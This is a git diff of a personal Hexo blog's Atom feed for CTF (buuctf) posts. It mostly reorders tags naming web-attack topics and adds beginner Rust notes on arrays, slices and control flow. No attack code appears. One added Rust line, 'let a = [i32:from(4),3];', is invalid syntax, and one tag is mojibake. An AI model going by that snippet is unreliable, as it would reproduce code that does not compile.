@@ -4,140 +4,147 @@
     <title>Hexo • Posts by &#34;buuctf&#34; tag</title>
     <link href="http://odiws.github.io" />
     <updated>2025-03-28T11:58:38.000Z</updated>
-    <category term="buuctf" />
     <category term="system_file" />
-    <category term="sql文件读取" />
+    <category term="buuctf" />
     <category term="文件内无字符rce" />
-    <category term="文件上传" />
+    <category term="ctf" />
     <category term="php绕过open_basedir设置" />
     <category term="无字母rce" />
-    <category term="ctf" />
-    <category term="php原生类利用" />
+    <category term="sql文件读取" />
+    <category term="文件上传" />
+    <category term="xxe" />
+    <category term="xml_upload" />
     <category term="php反序列化" />
-    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
     <category term="http" />
+    <category term="php原生类利用" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
     <category term="cms框架" />
-    <category term="python" />
     <category term="mongodb注入" />
+    <category term="python" />
+    <category term="buuctf，无字符rce" />
     <category term="条件竞争：利用session.upload_progress" />
+    <category term="misc" />
+    <category term="图片" />
+    <category term="buuctf， 反序列化" />
+    <category term="CRC" />
+    <category term="ECB加密" />
+    <category term="json数据爬虫" />
+    <category term="regexp注入" />
+    <category term="js" />
     <category term="preg_match绕过" />
     <category term="$_server query_string 绕过" />
     <category term="$_request绕过" />
     <category term="file_get_cotents绕过" />
     <category term="sha1函数比较数组绕过" />
     <category term="create_function运用" />
-    <category term="buuctf， 反序列化" />
-    <category term="regexp注入" />
-    <category term="ECB加密" />
-    <category term="php7 segment fault特性" />
-    <category term="json数据爬虫" />
-    <category term="phar反序列化" />
-    <category term="js" />
-    <category term="CRLF Injection" />
-    <category term="soap" />
-    <category term="pickle反序列化" />
-    <category term="thinkphpV6.0.0" />
-    <category term="buuctf， 伪随机数" />
-    <category term="zip加密" />
-    <category term="xxe" />
-    <category term="xml_upload" />
     <category term="flask的session伪造" />
-    <category term="二次渲染" />
     <category term="buuctf，Perl后端文件上传" />
-    <category term="buuctf，xxe漏洞" />
-    <category term="java" />
     <category term="flask" />
-    <category term="ctf工具安装教程" />
+    <category term="二次渲染" />
     <category term="sql注入" />
     <category term="php绕过open_opedir设置" />
     <category term="TOTP" />
     <category term="rce" />
     <category term="ssti" />
-    <category term="insert截断" />
-    <category term="xss攻击" />
     <category term="c的预处理" />
+    <category term="javaweb" />
     <category term="图片类" />
+    <category term="xss攻击" />
+    <category term="insert截断" />
     <category term="爬虫" />
-    <category term="js原型链污染" />
     <category term="反序列化字符串逃逸" />
+    <category term="thinkphpV6.0.0" />
     <category term="sql injection" />
-    <category term="文件上传(头像上传)" />
-    <category term="session反序列化" />
+    <category term="字频统计" />
+    <category term="phar反序列化" />
     <category term="ssrf" />
     <category term="HTTP走私攻击" />
-    <category term="json数据unicode转码绕过" />
-    <category term="对sqlite的sql注入" />
-    <category term="未理解" />
-    <category term="命令执行" />
     <category term="zip软链接" />
     <category term="python_seed函数" />
+    <category term="js原型链污染" />
+    <category term="未理解" />
     <category term="session伪造" />
     <category term="js-vm沙箱逃逸" />
-    <category term="willphp2.2" />
     <category term="ssti-smarty3.1.39" />
-    <category term="./htaccess文件上传" />
-    <category term="php未解析" />
-    <category term="利用环境变量构造bash命令" />
+    <category term="session反序列化" />
+    <category term="命令执行" />
+    <category term="对sqlite的sql注入" />
+    <category term="willphp2.2" />
+    <category term="json数据unicode转码绕过" />
     <category term="利用.htaccess构成后门" />
     <category term="通过php_value来设置preg_macth正则回溯次数" />
-    <category term="java反序列化" />
+    <category term="文件上传(头像上传)" />
+    <category term="Go" />
     <category term="伪随机数" />
-    <category term="mysql" />
-    <category term="信息搜集（js，网络）" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
     <category term="异或" />
-    <category term="密码爆破" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="信息搜集（js，网络）" />
+    <category term="sqlmap" />
+    <category term="pydash" />
+    <category term="xpath注入" />
+    <category term="文件包含" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
     <category term="sqlmap使用" />
     <category term="SQL注入" />
-    <category term="文件包含" />
     <category term="php伪协议" />
     <category term="pearcmd文件包含" />
-    <category term="xpath注入" />
-    <category term="Padding oracle attack 与CBC翻转字节攻击" />
-    <category term="php" />
+    <category term="密码爆破" />
     <category term="sql盲注" />
+    <category term="thinkphp3.2.4" />
     <category term="php7.4" />
     <category term="FFI预处理" />
-    <category term="thinkphp3.2.4" />
     <category term="jwt" />
-    <category term="sql二次注入" />
     <category term="MD5碰撞" />
     <category term="jwt密码爆破" />
     <category term="cms" />
+    <category term="sql二次注入" />
     <category term="create_function()函数" />
-    <category term="sqlע��" />
-    <category term="jwt身份验证" />
+    <category term="音频类" />
+    <category term="敲击码" />
+    <category term="010编码" />
     <category term="rc4" />
     <category term="CRLF" />
-    <category term="任意文件读取" />
-    <category term="PDO堆叠注入" />
+    <category term="jwt身份验证" />
     <category term="test" />
     <category term="tag2" />
-    <category term="shell反弹" />
-    <category term="phpexit绕过" />
+    <category term="NTFs数据流" />
     <category term="require_once函数" />
-    <category term="xss" />
-    <category term="302跳转" />
-    <category term="反序列化" />
-    <category term="F5隐写" />
-    <category term="php伪协议+文件上传" />
-    <category term="无字符rce" />
-    <category term="fastcgi-php-FPM" />
-    <category term="disable_function" />
-    <category term="nodejs" />
-    <category term="hash_hamc函数" />
-    <category term="取反异或" />
-    <category term="misc" />
-    <category term="图片" />
-    <category term="CRC" />
+    <category term="phpexit绕过" />
+    <category term="PDO堆叠注入" />
+    <category term="php7 segment fault特性" />
     <category term="vulhub" />
     <category term="ActiveMQ" />
-    <category term="javaweb" />
-    <category term="Go" />
-    <category term="sqlmap" />
-    <category term="pydash" />
+    <category term="pickle反序列化" />
+    <category term="buuctf， 伪随机数" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="ctf工具安装教程" />
+    <category term="java" />
+    <category term="java反序列化" />
+    <category term="php" />
+    <category term="mysql" />
     <category term="rust" />
+    <category term="python原型链污染" />
+    <category term="任意文件读取" />
+    <category term="sqlע��" />
+    <category term="xss" />
+    <category term="zip加密" />
+    <category term="shell反弹" />
+    <category term="F5隐写" />
+    <category term="302跳转" />
+    <category term="无字符rce" />
+    <category term="php伪协议+文件上传" />
+    <category term="反序列化" />
+    <category term="hash_hamc函数" />
+    <category term="取反异或" />
+    <category term="fastcgi-php-FPM" />
+    <category term="disable_function" />
     <category term="流量分析" />
     <category term="jpg特征" />
+    <category term="nodejs" />
     <entry>
         <id>http://odiws.github.io/2025/03/28/rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
         <title>rust学习笔记</title>
@@ -662,7 +669,17 @@ let none = plus_one(None); // 仍然是 None
 元素必须有相同的类型
 依次线性排列
 &lt;/code&gt;&lt;/pre&gt;
-</content>
+&lt;p&gt;数组越界会直接报错&lt;/p&gt;
+&lt;p&gt;数组的赋值：&lt;/p&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//let a:[i32;3]=[4,4,4];&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里仅限于基础类型，如果是复杂类型&lt;/p&gt;
+&lt;p&gt;就得这样写：&lt;/p&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; array &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;println!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#123;:#?&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; array&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;也可以调用 std::array::from_fn&lt;/p&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; array&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token namespace&#34;&gt;std&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from_fn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token closure-params&#34;&gt;&lt;span class=&#34;token closure-punctuation punctuation&#34;&gt;|&lt;/span&gt;_i&lt;span class=&#34;token closure-punctuation punctuation&#34;&gt;|&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;println!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#123;:#?&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;rust is good!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;数组切片&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数组切片&#34;&gt;#&lt;/a&gt; 数组切片：&lt;/h3&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; slice&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;assert_eq!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;slice&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;流程控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#流程控制&#34;&gt;#&lt;/a&gt; 流程控制&lt;/h2&gt;
+&lt;p&gt;语法:&lt;/p&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; condition&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//A...&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//B...&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;但是 if 和 else 返回值不统一时会报错（用 if 赋值时）&lt;/p&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;for 循环：&lt;/p&gt;
+&lt;figure class=&#34;highlight rust&#34;&gt;&lt;figcaption data-lang=&#34;rust&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token macro property&#34;&gt;println!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
         <category term="buuctf" />
         <category term="rust" />
         <updated>2025-03-28T11:58:38.000Z</updated>
@@ -6983,8 +7000,8 @@ error 原生类 __toString 方法的结果是相同的。 记住行号也需要�
 &lt;p&gt;对 php 原生类 有了些许了解，但还需要继续学习。&lt;/p&gt;
 </content>
         <category term="buuctf" />
-        <category term="php原生类利用" />
         <category term="php反序列化" />
